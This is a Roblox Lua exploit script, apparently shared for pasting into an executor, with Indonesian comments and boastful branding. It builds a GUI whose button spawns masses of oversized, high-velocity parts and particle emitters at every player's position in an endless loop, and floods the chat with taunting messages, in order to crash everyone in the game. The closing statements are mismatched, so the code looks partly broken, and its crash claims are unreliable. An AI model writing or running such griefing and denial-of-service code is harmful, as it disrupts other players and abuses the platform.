-- TheDestroyer Ω – EVERYONE CRASH EDITION 2025
-- by rajxzdev – THE TRUE FINAL BOSS
-- Paste langsung → semua player crash dalam 1 detik

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- GUI TERBAIK YANG PERNAH DIBUAT
local sg = Instance.new("ScreenGui")
sg.Name = "OmegaFinal"
sg.Parent = game.CoreGui
sg.ResetOnSpawn = false

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 500, 0, 320)
main.Position = UDim2.new(0.5, -250, 0.5, -160)
main.BackgroundColor3 = Color3.fromRGB(8, 0, 0)
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true
main.Parent = sg

local glow = Instance.new("ImageLabel")
glow.Size = UDim2.new(1, 80, 1, 80)
glow.Position = UDim2.new(0, -40, 0, -40)
glow.BackgroundTransparency = 1
glow.Image = "rbxassetid://4996891970"
glow.ImageColor3 = Color3.fromRGB(255, 0, 0)
glow.ImageTransparency = 0.3
glow.ZIndex = 0
glow.Parent = main

local top = Instance.new("Frame")
top.Size = UDim2.new(1, 0, 0, 80)
top.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
top.Parent = main

local title = Instance.new("TextLabel")
title.Text = "TheDestroyer Ω"
title.Font = Enum.Font.GothamBlack
title.TextSize = 40
title.TextColor3 = Color3.new(1,1,1)
title.BackgroundTransparency = 1
title.Size = UDim2.new(1, 0, 1, 0)
title.TextStrokeTransparency = 0
title.Parent = top

local warning = Instance.new("TextLabel")
warning.Position = UDim2.new(0, 0, 0, 90)
warning.Size = UDim2.new(1, 0, 0, 60)
warning.BackgroundTransparency = 1
warning.Text = "SEMUA PLAYER AKAN CRASH DALAM 1 DETIK"
warning.TextColor3 = Color3.fromRGB(255, 80, 80)
warning.Font = Enum.Font.GothamBold
warning.TextSize = 24
warning.TextStrokeTransparency = 0
warning.Parent = main

local nuke = Instance.new("TextButton")
nuke.Size = UDim2.new(0, 420, 0, 120)
nuke.Position = UDim2.new(0.5, -210, 0.5, 20)
nuke.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
nuke.Text = "EXECUTE OMEGA"
nuke.TextColor3 = Color3.new(1,1,1)
nuke.Font = Enum.Font.GothamBlack
nuke.TextSize = 56
nuke.TextStrokeTransparency = 0
nuke.Parent = main

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 25)
corner.Parent = main
corner:Clone().Parent = top
corner:Clone().Parent = nuke

-- THE TRUE 1-SECOND EVERYONE CRASH
nuke.MouseButton1Click:Connect(function()
    nuke.Text = "EVERYONE DEAD"
    nuke.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    
    spawn(function()
        while task.wait(0.001) do
            for _, plr in pairs(Players:GetPlayers()) do
                if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                    for i = 1, 800 do
                        spawn(function()
                            local p = Instance.new("Part")
                            p.Size = Vector3.new(300,300,300)
                            p.Position = plr.Character.HumanoidRootPart.Position
                            p.Anchored = false
                            p.CanCollide = false
                            p.Transparency = 1
	                        p.Parent = Workspace
                            local bv = Instance.new("BodyVelocity", p)
                            bv.Velocity = Vector3.new(9e9,9e9,9e9)
                            bv.MaxForce = Vector3.new(9e9,9e9,9e9)
                            
                            local pe = Instance.new("ParticleEmitter", p)
                            pe.Rate = 999999
                            pe.Lifetime = NumberRange.new(99)
                            pe.Speed = NumberRange.new(99999)
                            pe.Texture = "rbxassetid://241353019"
                            
                            game.Debris:AddItem(p, 0.05)
                        end)
                    end
                end
            end
        end
    end)
    
    -- SPAM CHAT KE SEMUA PLAYER
    spawn(function()
        while true do
            pcall(function()
                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("RAJXZDEV JUST ENDED YOUR GAME", "All")
            end)
            task.wait(0.01)
        end
    end)
end

print("TheDestroyer Ω – EVERYONE CRASH ACTIVE – rajxzdev has ended Roblox")
game.StarterGui:SetCore("SendNotification", {
    Title = "Ω EXECUTED";
    Text = "Semua player sekarang masuk neraka – rajxzdev";
    Duration = 10;
})
end)

print("TheDestroyer Ω FULL BRUTAL GUI LOADED – rajxzdev is the final entity")
